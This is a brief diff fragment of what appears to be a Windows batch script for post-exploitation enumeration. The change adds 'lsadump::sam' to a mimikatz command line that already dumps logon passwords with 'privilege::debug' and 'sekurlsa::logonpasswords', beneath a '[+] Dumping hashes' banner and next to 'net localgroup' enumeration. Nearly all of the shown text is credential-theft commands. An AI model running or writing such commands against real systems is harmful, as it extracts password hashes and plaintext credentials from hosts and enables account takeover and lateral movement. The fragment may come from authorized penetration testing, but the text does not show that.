@@ -35,7 +35,7 @@ net localgroup
 echo.
 echo [+] Dumping hashes
 echo.
-mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
 echo.
 echo ------- NETWORK INFO -------
 echo.
